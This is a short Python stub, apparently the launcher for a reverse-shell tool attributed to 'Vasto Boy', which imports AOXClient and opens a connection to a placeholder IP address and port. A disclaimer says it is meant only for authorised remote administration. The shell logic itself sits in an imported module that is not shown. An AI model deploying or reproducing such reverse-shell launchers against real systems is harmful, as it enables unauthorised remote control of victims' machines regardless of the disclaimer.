# Created by Vasto Boy

# Disclaimer: This reverse shell should only be used in the lawful, remote administration of authorized systems. Accessing a computer network without authorization or permission is illegal.

from aox_client import AOXClient


aox_client = AOXClient("IP-ADDRESS", "PORT-1")
aox_client.establish_connection()
